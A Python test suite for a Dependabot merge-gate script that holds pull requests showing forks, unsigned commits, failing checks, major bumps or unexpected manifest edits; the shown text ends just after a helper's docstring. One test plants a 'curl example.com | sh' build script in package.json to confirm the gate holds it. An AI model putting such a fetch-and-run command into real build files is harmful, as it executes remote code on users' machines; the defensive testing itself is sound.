#!/usr/bin/env python3
# SPDX-License-Identifier: MPL-2.0
"""Tests for dependabot-gate.py, its workflow and .github/dependabot.yml.

Fixtures (scripts/testdata/dependabot-gate/), so the test needs no network and
no git history: pr-189.json, pr-190.json and pr-191.json are the snapshots the
script itself took of the three Dependabot pull requests open on 2026-11-23
(`dependabot-gate.py gate --repo invowk/invowk --pr N --snapshot-out FILE`),
unedited. A snapshot holds only the fields the rules read. Expected verdicts:
  - #189 (npm): hold, typescript 6 -> 7 is semver-major;
  - #190 (gomod): hold, failing checks and coder/acp-go-sdk 0.13.5 -> 0.20.0
    (a 0.x minor that broke the build);
  - #191 (github-actions): hold, not an ecosystem the gate merges.

The rule tests start from two derived snapshots that merge (`green_gomod`:
#190 without acp-go-sdk and with its failed checks passing; `green_npm`: #189
without typescript) and change one thing each. Every rule was calibrated by
removing it from the script and watching its test fail.

The policy tables are checked against the live repository (go.mod,
website/package.json, the workflow files, .github/dependabot.yml), so a
renamed job or a dropped dependency fails here.
"""

from __future__ import annotations

import contextlib
import copy
import fnmatch
import importlib.util
import io
import json
import re
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.dont_write_bytecode = True
HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
FIXTURES = HERE / "testdata" / "dependabot-gate"
WORKFLOWS = ROOT / ".github" / "workflows"
GATE_WORKFLOW = WORKFLOWS / "dependabot-gate.yml"
DEPENDABOT_CONFIG = ROOT / ".github" / "dependabot.yml"
REPO = "invowk/invowk"
GUARD = "env.GATE_MODE == 'merge' && steps.decide.outputs.decision == 'merge'"


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module  # dataclasses resolve annotations through it
    spec.loader.exec_module(module)
    return module


GATE = load("dependabot_gate", HERE / "dependabot-gate.py")
# The block-style YAML reader the parity check already tests; flow values
# such as `{}` come back as their text.
load_yaml = load("check_ci_release_parity", HERE / "check-ci-release-parity.py").load_yaml


def real(number: int) -> dict:
    return json.loads((FIXTURES / f"pr-{number}.json").read_text(encoding="utf-8"))


def drop_dependency(snapshot: dict, name: str) -> None:
    """Remove one dependency from the head commit's metadata and the manifest diff."""
    commit = snapshot["commits"][0]["commit"]
    kept: list[str] = []
    skipping = False
    for line in commit["message"].split("\n"):
        if line.startswith("- dependency-name: "):
            skipping = line == f"- dependency-name: {name}"
        elif not line.startswith("  "):
            skipping = False
        if not skipping:
            kept.append(line)
    assert len(kept) < len(commit["message"].split("\n")), name
    commit["message"] = "\n".join(kept)
    for entry in snapshot["files"]:
        if "patch" in entry:
            lines = [
                line
                for line in entry["patch"].split("\n")
                if not (line[:1] in "+-" and (f"\t{name} " in line or f'"{name}"' in line))
            ]
            assert len(lines) < len(entry["patch"].split("\n")), name
            entry["patch"] = "\n".join(lines)


def green_gomod() -> dict:
    snapshot = real(190)
    drop_dependency(snapshot, "github.com/coder/acp-go-sdk")
    for run in snapshot["check_runs"]:
        if run["conclusion"] == "failure":
            run["conclusion"] = "success"
    return snapshot


def green_npm() -> dict:
    snapshot = real(189)
    drop_dependency(snapshot, "typescript")
    return snapshot


def message_of(snapshot: dict) -> str:
    return snapshot["commits"][0]["commit"]["message"]


def set_message(snapshot: dict, message: str) -> None:
    snapshot["commits"][0]["commit"]["message"] = message


def run_named(snapshot: dict, name: str) -> dict:
    (run,) = [run for run in snapshot["check_runs"] if run["name"] == name]
    return run


def manifest_entry(snapshot: dict) -> dict:
    (entry,) = [entry for entry in snapshot["files"] if "patch" in entry]
    return entry


class GateTestCase(unittest.TestCase):
    def assert_merges(self, snapshot: dict) -> dict:
        verdict = GATE.decide(snapshot)
        self.assertEqual((verdict["decision"], verdict["reasons"]), ("merge", []))
        return verdict

    def assert_holds(self, snapshot: object, *fragments: str, only: bool = True) -> dict:
        """Hold, with one reason per fragment (and no other reason when `only`)."""
        verdict = GATE.decide(snapshot)
        self.assertEqual(verdict["decision"], "hold", verdict)
        for fragment in fragments:
            self.assertTrue(any(fragment in reason for reason in verdict["reasons"]), (fragment, verdict["reasons"]))
        if only:
            self.assertEqual(len(verdict["reasons"]), len(fragments), verdict["reasons"])
        return verdict


class RealPullRequestTests(GateTestCase):
    def test_189_holds_on_the_typescript_major(self) -> None:
        verdict = self.assert_holds(
            real(189), '"typescript": update type "version-update:semver-major" is not semver-patch or semver-minor'
        )
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (189, "npm"))
        self.assertEqual([dep["dependency-name"] for dep in verdict["dependencies"]], ["react", "react-dom", "typescript"])

    def test_190_holds_on_failing_checks_and_the_0x_minor(self) -> None:
        verdict = self.assert_holds(
            real(190),
            '"github.com/coder/acp-go-sdk": a minor bump to 0.20.0 is a 0.x release, treated as breaking',
            'check "Test (windows)" ("github-actions") concluded "failure"',
            'check "govulncheck" ("github-actions") concluded "failure"',
            'check "goplint consumer gates" ("github-actions") concluded "failure"',
            only=False,
        )
        self.assertEqual(len(verdict["reasons"]), 12, verdict["reasons"])
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (190, "gomod"))
        self.assertEqual(len(verdict["dependencies"]), 10)

    def test_191_holds_because_github_actions_updates_never_merge(self) -> None:
        verdict = self.assert_holds(
            real(191),
            'the head branch "dependabot/github_actions/github-actions-5f5cef2c17" is not a gomod or npm',
            only=False,
        )
        self.assertIsNone(verdict["ecosystem"])


class GreenBaselineTests(GateTestCase):
    def test_all_green_patch_and_minor_gomod_update_merges(self) -> None:
        verdict = self.assert_merges(green_gomod())
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (190, "gomod"))
        self.assertEqual(verdict["head_sha"], "862bccdff65c5b51281858c8c9c6b2f716c032b0")
        self.assertEqual(len(verdict["dependencies"]), 9)
        self.assertEqual({dep["update-type"] for dep in verdict["dependencies"]}, set(GATE.ALLOWED_UPDATE_TYPES))

    def test_all_green_minor_npm_update_merges(self) -> None:
        verdict = self.assert_merges(green_npm())
        self.assertEqual((verdict["pull_request"], verdict["ecosystem"]), (189, "npm"))


class PullRequestRuleTests(GateTestCase):
    def test_author_must_be_the_dependabot_bot(self) -> None:
        for field, value in (("login", "mallory"), ("id", 1), ("type", "User")):
            with self.subTest(field=field):
                snapshot = green_gomod()
                snapshot["pull_request"]["user"][field] = value
                self.assert_holds(snapshot, "the pull request author is")

    def test_base_must_be_main(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["base"]["ref"] = "release"
        self.assert_holds(snapshot, 'the base branch is "release"')

    def test_base_must_be_this_repository(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["base"]["repo"]["full_name"] = "mallory/invowk"
        self.assert_holds(snapshot, "the base repository is")

    def test_fork_head_holds(self) -> None:
        for head_repo in ({"full_name": "mallory/invowk"}, None):
            with self.subTest(head_repo=head_repo):
                snapshot = green_gomod()
                snapshot["pull_request"]["head"]["repo"] = head_repo
                self.assert_holds(snapshot, "(a fork)")

    def test_closed_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["state"] = "closed"
        self.assert_holds(snapshot, 'the pull request is "closed", not open')

    def test_draft_holds(self) -> None:
        for draft in (True, None):
            with self.subTest(draft=draft):
                snapshot = green_gomod()
                snapshot["pull_request"]["draft"] = draft
                self.assert_holds(snapshot, "the pull request is a draft")

    def test_merge_conflict_holds(self) -> None:
        for mergeable in (False, None, "true"):
            with self.subTest(mergeable=mergeable):
                snapshot = green_gomod()
                snapshot["pull_request"]["mergeable"] = mergeable
                self.assert_holds(snapshot, "does not report the pull request as mergeable")
        for state in ("dirty", "behind", "unknown", "draft", "something-new", None):
            with self.subTest(state=state):
                snapshot = green_gomod()
                snapshot["pull_request"]["mergeable_state"] = state
                self.assert_holds(snapshot, "merge state is")
        for state in sorted(GATE.MERGEABLE_STATES):
            with self.subTest(state=state):
                snapshot = green_gomod()
                snapshot["pull_request"]["mergeable_state"] = state
                self.assert_merges(snapshot)

    def test_hold_label_holds(self) -> None:
        for name in ("hold", "HOLD", "do-not-merge", "Do-Not-Merge"):
            with self.subTest(label=name):
                snapshot = green_gomod()
                snapshot["pull_request"]["labels"] = [{"name": "dependencies"}, {"name": name}]
                self.assert_holds(snapshot, "the pull request has the label")
        snapshot = green_gomod()
        snapshot["pull_request"]["labels"] = [{"name": "dependencies"}, {"name": "go"}, {"name": "on-hold-list"}]
        self.assert_merges(snapshot)

    def test_unreadable_labels_hold(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["labels"] = None
        self.assert_holds(snapshot, "labels could not be read")
        snapshot = green_gomod()
        snapshot["pull_request"]["labels"] = ["hold"]
        self.assert_holds(snapshot, "a pull request label has no name")

    def test_number_must_be_an_integer(self) -> None:
        for number in ("190", None, 0, True):
            with self.subTest(number=number):
                snapshot = green_gomod()
                snapshot["pull_request"]["number"] = number
                self.assert_holds(snapshot, "pull request number not understood")

    def test_head_sha_mismatch_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["head_sha"] = "0" * 40
        self.assert_holds(snapshot, "but the pull request head is now")

    def test_malformed_triggering_sha_holds(self) -> None:
        for sha in ("main", "862bccd", "", None, "862BCCDFF65C5B51281858C8C9C6B2F716C032B0"):
            with self.subTest(sha=sha):
                snapshot = green_gomod()
                snapshot["head_sha"] = sha
                verdict = self.assert_holds(snapshot, "the triggering head SHA is not a commit SHA")
                self.assertIsNone(verdict["head_sha"])


class CommitRuleTests(GateTestCase):
    def test_commit_by_someone_else_holds(self) -> None:
        for field, value in (("login", "mallory"), ("id", 1)):
            with self.subTest(field=field):
                snapshot = green_gomod()
                snapshot["commits"][0]["author"][field] = value
                self.assert_holds(snapshot, "is authored by")
        snapshot = green_gomod()
        snapshot["commits"][0]["author"] = None
        self.assert_holds(snapshot, "is authored by")

    def test_commit_committed_by_someone_else_holds(self) -> None:
        # A person who signs with their own key and sets Dependabot as author.
        for committer in ({"login": "mallory", "id": 1}, {"login": "web-flow", "id": 1}, None):
            with self.subTest(committer=committer):
                snapshot = green_gomod()
                snapshot["commits"][0]["committer"] = committer
                self.assert_holds(snapshot, "is committed by")
        snapshot = green_gomod()
        snapshot["commits"][0]["committer"] = {"login": "dependabot[bot]", "id": 49699333}
        self.assert_merges(snapshot)

    def test_unverified_commit_holds(self) -> None:
        for verification in ({"verified": False, "reason": "unsigned"}, {"verified": "true"}, {}, None):
            with self.subTest(verification=verification):
                snapshot = green_gomod()
                snapshot["commits"][0]["commit"]["verification"] = verification
                self.assert_holds(snapshot, "has no verified signature")

    def test_second_commit_holds(self) -> None:
        snapshot = green_gomod()
        human = copy.deepcopy(snapshot["commits"][0])
        human.update(sha="1" * 40, author={"login": "mallory", "id": 1}, committer={"login": "mallory", "id": 1})
        snapshot["commits"].append(human)
        snapshot["pull_request"]["commits"] = 2
        self.assert_holds(
            snapshot,
            "expected exactly one commit (Dependabot's), found 2",
            "is authored by",
            "is committed by",
            "the last commit listed is not the pull request head",
        )

    def test_two_dependabot_commits_hold(self) -> None:
        # Only the head commit's metadata is read, so a second commit holds
        # even when it is Dependabot's own.
        snapshot = green_gomod()
        first = copy.deepcopy(snapshot["commits"][0])
        first["sha"] = "1" * 40
        snapshot["commits"].insert(0, first)
        snapshot["pull_request"]["commits"] = 2
        self.assert_holds(snapshot, "expected exactly one commit (Dependabot's), found 2")

    def test_incomplete_commit_list_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["commits"] = 2
        self.assert_holds(snapshot, "does not match the pull request's commit count")
        snapshot = green_gomod()
        snapshot["commits"] = []
        self.assert_holds(snapshot, "expected exactly one commit", "commit count", "head commit message", only=False)

    def test_listed_commit_must_be_the_head(self) -> None:
        snapshot = green_gomod()
        snapshot["commits"][0]["sha"] = "1" * 40
        self.assert_holds(snapshot, "the last commit listed is not the pull request head", "head commit message", only=False)


class MetadataRuleTests(GateTestCase):
    def test_missing_block_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, "deps(go): bump something\n\nSigned-off-by: dependabot[bot] <support@github.com>")
        self.assert_holds(snapshot, "metadata of the head commit is missing or unreadable", "update types", only=False)

    def test_unparseable_block_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("  update-type: ", "  update-type:\n    nested: "))
        self.assert_holds(snapshot, "metadata of the head commit is missing or unreadable", "update types", only=False)

    def test_major_update_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("version-update:semver-patch", "version-update:semver-major", 1))
        self.assert_holds(snapshot, '"charm.land/log/v2": update type "version-update:semver-major"')

    def test_missing_update_type_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("  update-type: version-update:semver-patch\n", "", 1))
        self.assert_holds(snapshot, '"charm.land/log/v2": update type null')

    def test_minor_bump_of_a_0x_version_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("dependency-version: 2.1.2", "dependency-version: 0.21.0"))
        self.assert_holds(snapshot, '"charm.land/bubbletea/v2": a minor bump to 0.21.0 is a 0.x release')

    def test_patch_bump_of_a_0x_version_merges(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("dependency-version: 2.0.1", "dependency-version: 0.4.1"))
        self.assert_merges(snapshot)

    def test_version_must_be_a_release(self) -> None:
        for version in ("'7'", "2.1.2-rc.1", "0.0.0-20260908205506-85c1c2202aba", "2.1.2+incompatible", "latest"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_message(snapshot, message_of(snapshot).replace("dependency-version: 2.1.2", f"dependency-version: {version}"))
                self.assert_holds(snapshot, "is not a released x.y.z version")
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("  dependency-version: 2.1.2\n", ""))
        self.assert_holds(snapshot, '"charm.land/bubbletea/v2": new version null')

    def test_deny_listed_dependency_holds(self) -> None:
        for name, reason in GATE.DENY_GOMOD.items():
            with self.subTest(name=name):
                snapshot = green_gomod()
                set_message(snapshot, message_of(snapshot).replace("dependency-name: charm.land/log/v2", f"dependency-name: {name}"))
                self.assert_holds(snapshot, f"{name} is on the sync-pair deny list: {reason}")
        for name, reason in GATE.DENY_NPM.items():
            with self.subTest(name=name):
                snapshot = green_npm()
                set_message(snapshot, message_of(snapshot).replace("dependency-name: react-dom", f'dependency-name: "{name}"'))
                entry = manifest_entry(snapshot)
                entry["patch"] = "\n".join(line for line in entry["patch"].split("\n") if '"react-dom"' not in line)
                self.assert_holds(snapshot, f"{name} is on the sync-pair deny list: {reason}")

    def test_deny_lists_do_not_cross_ecosystems(self) -> None:
        self.assertFalse(set(GATE.DENY_GOMOD) & set(GATE.DENY_NPM))
        self.assertEqual({eco.name: eco.deny for eco in GATE.ECOSYSTEMS}, {"gomod": GATE.DENY_GOMOD, "npm": GATE.DENY_NPM})


class ParserTests(unittest.TestCase):
    BLOCK = (
        "subject\n\nbody\n\n---\nupdated-dependencies:\n"
        "- dependency-name: react\n  dependency-version: 19.3.1\n  dependency-type: direct:production\n"
        "  update-type: version-update:semver-minor\n  dependency-group: npm-dependencies\n"
        "- dependency-name: \"@docusaurus/core\"\n  dependency-version: '7'\n"
        "...\n\nSigned-off-by: dependabot[bot] <support@github.com>"
    )

    def test_reads_the_block(self) -> None:
        self.assertEqual(
            GATE.parse_updated_dependencies(self.BLOCK),
            [
                {
                    "dependency-name": "react",
                    "dependency-version": "19.3.1",
                    "dependency-type": "direct:production",
                    "update-type": "version-update:semver-minor",
                    "dependency-group": "npm-dependencies",
                },
                {"dependency-name": "@docusaurus/core", "dependency-version": "7"},
            ],
        )

    def test_reads_the_real_messages(self) -> None:
        for number, count in ((189, 3), (190, 10), (191, 4)):
            with self.subTest(pr=number):
                self.assertEqual(len(GATE.parse_updated_dependencies(message_of(real(number)))), count)

    def test_rejects_anything_else(self) -> None:
        item = "- dependency-name: react\n  dependency-version: 19.3.1\n"
        cases = {
            "not a string": None,
            "no block": "subject\n\nbody",
            "no --- line": f"subject\nupdated-dependencies:\n{item}...\n",
            "block at the top": f"updated-dependencies:\n{item}...\n",
            "no closing line": f"s\n---\nupdated-dependencies:\n{item}",
            "two blocks": f"s\n---\nupdated-dependencies:\n{item}...\n---\nupdated-dependencies:\n{item}...\n",
            "empty block": "s\n---\nupdated-dependencies:\n...\n",
            "flow list": "s\n---\nupdated-dependencies: []\n...\n",
            "key before the first item": "s\n---\nupdated-dependencies:\n  dependency-name: react\n...\n",
            "item without a name": "s\n---\nupdated-dependencies:\n- dependency-version: 19.3.1\n...\n",
            "unknown key": f"s\n---\nupdated-dependencies:\n{item}  directory: website\n...\n",
            "duplicate key": f"s\n---\nupdated-dependencies:\n{item}  dependency-version: 1.0.0\n...\n",
            "nested mapping": f"s\n---\nupdated-dependencies:\n{item}  update-type:\n    a: b\n...\n",
            "wrong indentation": "s\n---\nupdated-dependencies:\n- dependency-name: react\n    update-type: x\n...\n",
            "tab indentation": "s\n---\nupdated-dependencies:\n- dependency-name: react\n\tupdate-type: x\n...\n",
            "blank line": f"s\n---\nupdated-dependencies:\n{item}\n...\n",
            "carriage returns": f"s\r\n---\r\nupdated-dependencies:\r\n{item}...\r\n",
            "empty value": "s\n---\nupdated-dependencies:\n- dependency-name: ''\n...\n",
            "value with a space": "s\n---\nupdated-dependencies:\n- dependency-name: react dom\n...\n",
            "comment": "s\n---\nupdated-dependencies:\n- dependency-name: react #x\n...\n",
            "flow value": "s\n---\nupdated-dependencies:\n- dependency-name: [react]\n...\n",
            "anchor": "s\n---\nupdated-dependencies:\n- dependency-name: &a react\n...\n",
            "escape in quotes": 's\n---\nupdated-dependencies:\n- dependency-name: "re\\"act"\n...\n',
            "unquoted number": "s\n---\nupdated-dependencies:\n- dependency-name: react\n  dependency-version: 1.10\n...\n",
            "unquoted boolean": "s\n---\nupdated-dependencies:\n- dependency-name: true\n...\n",
            "non-ASCII value": "s\n---\nupdated-dependencies:\n- dependency-name: 're\u202eact'\n...\n",
            "control character": "s\n---\nupdated-dependencies:\n- dependency-name: 're\x1bact'\n...\n",
        }
        for label, message in cases.items():
            with self.subTest(case=label), self.assertRaises(GATE.MetadataError):
                GATE.parse_updated_dependencies(message)


class EcosystemRuleTests(GateTestCase):
    def test_unknown_ecosystem_holds(self) -> None:
        for ref in (
            "dependabot/github_actions/actions/checkout-8",
            "dependabot/pip/requests-2.33.0",
            "feature/dependabot/go_modules/x",
            "Dependabot/go_modules/x",
            None,
        ):
            with self.subTest(ref=ref):
                snapshot = green_gomod()
                snapshot["pull_request"]["head"]["ref"] = ref
                self.assert_holds(
                    snapshot,
                    "is not a gomod or npm Dependabot branch",
                    "the deny list could not be evaluated without a known ecosystem",
                    "the required checks could not be evaluated without a known ecosystem",
                )

    def test_branch_and_files_must_agree(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["head"]["ref"] = "dependabot/npm_and_yarn/website/npm-dependencies-23c02d14cc"
        self.assert_holds(
            snapshot,
            'changed file "go.mod" is not one a npm update may touch',
            'changed file "go.sum" is not one a npm update may touch',
            "test-build",
        )

    def test_extra_changed_file_holds(self) -> None:
        for filename in ("main.go", ".github/workflows/ci.yml", "internal/basedir/testdata/guardfixture/nested/go.mod", "website/go.mod"):
            with self.subTest(filename=filename):
                snapshot = green_gomod()
                snapshot["files"].append({"filename": filename, "status": "modified"})
                snapshot["pull_request"]["changed_files"] = 3
                self.assert_holds(snapshot, f'changed file "{filename}" is not one a gomod update may touch')
        snapshot = green_npm()
        snapshot["files"].append({"filename": "website/docusaurus.config.ts", "status": "modified"})
        snapshot["pull_request"]["changed_files"] = 3
        self.assert_holds(snapshot, "is not one a npm update may touch")

    def test_incomplete_file_list_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["changed_files"] = 3
        self.assert_holds(snapshot, "does not match the pull request's changed-file count")
        for files in ([], None):
            with self.subTest(files=files):
                snapshot = green_gomod()
                snapshot["files"] = files
                self.assert_holds(snapshot, "the changed files could not be read")

    def test_file_must_be_modified_in_place(self) -> None:
        for status in ("added", "removed", "renamed"):
            with self.subTest(status=status):
                snapshot = green_gomod()
                snapshot["files"][1]["status"] = status
                self.assert_holds(snapshot, f'go.sum is "{status}", not modified')

    def test_deny_listed_module_changed_as_a_side_effect_holds(self) -> None:
        # golang.org/x/tools is an indirect requirement: Dependabot never
        # names it, but another module's bump can raise it.
        snapshot = green_gomod()
        manifest_entry(snapshot)["patch"] += (
            "\n@@ -297,7 +297,7 @@ require (\n-\tgolang.org/x/tools v0.52.0 // indirect\n+\tgolang.org/x/tools v0.53.0 // indirect"
        )
        self.assert_holds(snapshot, "go.mod changes golang.org/x/tools, which is on the sync-pair deny list")

    def test_go_mod_directive_change_holds(self) -> None:
        for change in ("-go 1.27.4\n+go 1.27.5", "+toolchain go1.27.5", "+replace example.com/a => ../a", "+\tgithub.com/invowk/goplint/cmd/extra", "+)"):
            with self.subTest(change=change):
                snapshot = green_gomod()
                manifest_entry(snapshot)["patch"] += f"\n@@ -1,3 +1,3 @@\n{change}"
                self.assert_holds(snapshot, "the go.mod diff is not a plain dependency update")

    def test_manifest_without_a_diff_holds(self) -> None:
        for snapshot in (green_gomod(), green_npm()):
            with self.subTest(ecosystem=snapshot["pull_request"]["head"]["ref"]):
                for patch in (None, ""):
                    manifest_entry(snapshot)["patch"] = patch
                    self.assert_holds(snapshot, "GitHub returned no diff for it")

    def test_lockfile_only_update_merges(self) -> None:
        snapshot = green_gomod()
        snapshot["files"] = [entry for entry in snapshot["files"] if entry["filename"] == "go.sum"]
        snapshot["pull_request"]["changed_files"] = 1
        self.assert_merges(snapshot)

    def test_package_json_change_outside_the_metadata_holds(self) -> None:
        snapshot = green_npm()
        manifest_entry(snapshot)["patch"] += '\n@@ -9,3 +9,3 @@\n-    "build": "docusaurus build",\n+    "build": "curl example.com | sh",'
        self.assert_holds(snapshot, 'website/package.json changes "build", which the dependency metadata does not name')
        snapshot = green_npm()
        manifest_entry(snapshot)["patch"] += '\n@@ -40,3 +40,3 @@\n-    "node": ">=20.0"\n+    "node": ">=22.0"'
        self.assert_holds(snapshot, 'website/package.json changes "node", which the dependency metadata does not name')
        for change in ('+  "private": false,', '-    "last 3 chrome version",', "+  },"):
            with self.subTest(change=change):
                snapshot = green_npm()
                manifest_entry(snapshot)["patch"] += f"\n@@ -1,3 +1,3 @@\n{change}"
                self.assert_holds(snapshot, "the website/package.json diff is not a plain dependency update")

    def test_deny_listed_package_changed_in_package_json_holds(self) -> None:
        snapshot = green_npm()
        manifest_entry(snapshot)["patch"] += '\n@@ -19,3 +19,3 @@\n-    "@docusaurus/core": "3.10.2",\n+    "@docusaurus/core": "3.10.3",'
        self.assert_holds(snapshot, "website/package.json changes @docusaurus/core, which is on the sync-pair deny list")

    def test_changed_manifest_keys(self) -> None:
        self.assertEqual(
            GATE.changed_manifest_keys("go.mod", manifest_entry(real(190))["patch"])[:3],
            ["charm.land/bubbletea/v2", "charm.land/lipgloss/v2", "charm.land/log/v2"],
        )
        self.assertEqual(
            GATE.changed_manifest_keys("website/package.json", manifest_entry(real(189))["patch"]),
            ["react", "react-dom", "typescript"],
        )


class CheckRuleTests(GateTestCase):
    def test_failed_check_holds(self) -> None:
        # Not a required check: every check on the head commit counts.
        snapshot = green_gomod()
        run_named(snapshot, "SonarCloud Code Analysis")["conclusion"] = "failure"
        self.assert_holds(snapshot, 'check "SonarCloud Code Analysis" ("sonarqubecloud") concluded "failure"')

    def test_pending_check_holds(self) -> None:
        for status in ("queued", "in_progress", "waiting", "requested", "pending", None):
            with self.subTest(status=status):
                snapshot = green_gomod()
                run_named(snapshot, "Test (windows)").update(status=status, conclusion=None)
                self.assert_holds(snapshot, 'check "Test (windows)" ("github-actions") is not completed')

    def test_cancelled_check_holds(self) -> None:
        for conclusion in ("cancelled", "timed_out", "action_required", "stale", "startup_failure", "something-new", None):
            with self.subTest(conclusion=conclusion):
                snapshot = green_gomod()
                run_named(snapshot, "Build (linux/amd64)")["conclusion"] = conclusion
                self.assert_holds(snapshot, 'check "Build (linux/amd64)" ("github-actions") concluded')

    def test_skipped_and_neutral_checks_pass_unless_required(self) -> None:
        for conclusion in ("skipped", "neutral"):
            with self.subTest(conclusion=conclusion):
                snapshot = green_gomod()
                run_named(snapshot, "Socket Security: Project Report")["conclusion"] = conclusion
                self.assert_merges(snapshot)
                run_named(snapshot, "License Headers")["conclusion"] = conclusion
                self.assert_holds(snapshot, f'required check "License Headers" concluded {conclusion}; it must succeed')

    def test_missing_required_check_holds(self) -> None:
        for eco, green in (("gomod", green_gomod), ("npm", green_npm)):
            for required in {"gomod": GATE.REQUIRED_GOMOD, "npm": GATE.REQUIRED_NPM}[eco]:
                with self.subTest(ecosystem=eco, check=required.name):
                    snapshot = green()
                    snapshot["check_runs"] = [
                        run
                        for run in snapshot["check_runs"]
                        if (run["name"], run["app"]["slug"]) != (required.name, required.app)
                    ]
                    self.assert_holds(snapshot, f'required check "{required.name}" ({required.workflow}) has not run')

    def test_required_check_from_another_app_does_not_count(self) -> None:
        snapshot = green_gomod()
        run_named(snapshot, "Test (windows)")["app"]["slug"] = "some-other-app"
        self.assert_holds(snapshot, 'required check "Test (windows)" (CI) has not run')

    def test_no_checks_at_all_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["check_runs"] = []
        verdict = self.assert_holds(snapshot, "has not run on the head commit", only=False)
        self.assertEqual(len(verdict["reasons"]), len(GATE.REQUIRED_GOMOD))
        for key in ("check_runs", "statuses"):
            with self.subTest(key=key):
                snapshot = green_gomod()
                snapshot[key] = None
                self.assert_holds(snapshot, "could not be read", only=False)

    def test_duplicate_run_must_pass_too(self) -> None:
        snapshot = green_gomod()
        failed = copy.deepcopy(run_named(snapshot, "Test (macos)"))
        failed["conclusion"] = "failure"
        snapshot["check_runs"].append(failed)
        self.assert_holds(snapshot, 'check "Test (macos)" ("github-actions") concluded "failure"')

    def test_check_run_of_another_commit_holds(self) -> None:
        snapshot = green_gomod()
        run_named(snapshot, "Socket Security: Project Report")["head_sha"] = "0" * 40
        self.assert_holds(snapshot, "is not for the pull request head")

    def test_malformed_check_run_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["check_runs"].append({"name": "x", "status": "completed", "conclusion": "success"})
        self.assert_holds(snapshot, "a check run has no name or app")

    def test_ignored_checks_are_not_read(self) -> None:
        for (name, app), reason in GATE.IGNORED_CHECKS.items():
            with self.subTest(check=name):
                self.assertGreater(len(reason), 40)
                snapshot = green_gomod()
                snapshot["check_runs"] = [run for run in snapshot["check_runs"] if run["name"] != name]
                run = {"name": name, "status": "completed", "conclusion": "failure", "app": {"slug": app}}
                snapshot["check_runs"].append({**run, "head_sha": snapshot["head_sha"]})
                self.assert_merges(snapshot)
                snapshot["check_runs"][-1]["status"] = "in_progress"
                self.assert_merges(snapshot)
                snapshot["check_runs"][-1]["app"] = {"slug": "some-other-app"}
                self.assert_holds(snapshot, f'check "{name}" ("some-other-app") is not completed')

    def test_only_documented_checks_are_ignored(self) -> None:
        self.assertEqual(
            sorted(GATE.IGNORED_CHECKS), [("Dependabot merge gate", "github-actions"), ("Track Benchmarks", "github-actions")]
        )
        for eco in GATE.ECOSYSTEMS:
            keys = [(required.name, required.app) for required in eco.required]
            self.assertEqual(len(keys), len(set(keys)), eco.name)
            self.assertFalse(set(keys) & set(GATE.IGNORED_CHECKS), eco.name)

    def test_commit_statuses_count(self) -> None:
        snapshot = green_gomod()
        snapshot["statuses"] = [{"context": "ci/external", "state": "success"}]
        self.assert_merges(snapshot)
        for state in ("failure", "error", "pending", None):
            with self.subTest(state=state):
                snapshot["statuses"] = [{"context": "ci/external", "state": state}]
                self.assert_holds(snapshot, 'commit status "ci/external" is')


class FailClosedTests(GateTestCase):
    def test_non_object_snapshots_hold(self) -> None:
        for snapshot in (None, [], "merge", 1):
            with self.subTest(snapshot=snapshot):
                self.assert_holds(snapshot, "the snapshot is not a JSON object", only=False)

    def test_every_missing_field_holds(self) -> None:
        def paths(value: object, prefix: tuple = ()) -> list[tuple]:
            found = []
            if isinstance(value, dict):
                for key, child in value.items():
                    found.append(prefix + (key,))
                    found.extend(paths(child, prefix + (key,)))
            elif isinstance(value, list) and value:
                found.extend(paths(value[0], prefix + (0,)))
            return found

        # `verification.reason` is kept in the snapshot for the reader only.
        unread = {("commits", 0, "commit", "verification", "reason")}
        for green in (green_gomod, green_npm):
            for path in paths(green()):
                if path in unread:
                    continue
                with self.subTest(ecosystem=green.__name__, removed=path):
                    snapshot = green()
                    parent = snapshot
                    for key in path[:-1]:
                        parent = parent[key]
                    del parent[path[-1]]
                    self.assert_holds(snapshot, only=False)

    def test_a_rule_that_raises_holds(self) -> None:
        def broken(ctx: object) -> None:
            raise RuntimeError("boom <script>")

        with mock.patch.object(GATE, "RULES", GATE.RULES + (broken,)):
            self.assert_holds(green_gomod(), 'broken could not be evaluated (RuntimeError: "boom <script>")')

    def test_every_rule_is_registered(self) -> None:
        rules = sorted(name for name in vars(GATE) if name.startswith("rule_"))
        self.assertEqual(rules, sorted(rule.__name__ for rule in GATE.RULES))
        self.assertEqual(len(rules), 8)

    def test_no_merge_without_an_ecosystem_and_dependencies(self) -> None:
        with mock.patch.object(GATE, "RULES", ()):
            self.assert_holds(green_gomod(), "no ecosystem or no dependency was established")


# ----------------------------------------------------------- policy tables


def workflow_docs() -> dict[str, dict]:
    docs = {}
    for path in sorted(WORKFLOWS.glob("*.yml")):
        doc = load_yaml(path.read_text(encoding="utf-8"))
        docs[doc["name"]] = doc
    return docs


def glob_matches(pattern: str, path: str) -> bool:
    """GitHub's path filter: `**` crosses directories, `*` does not."""
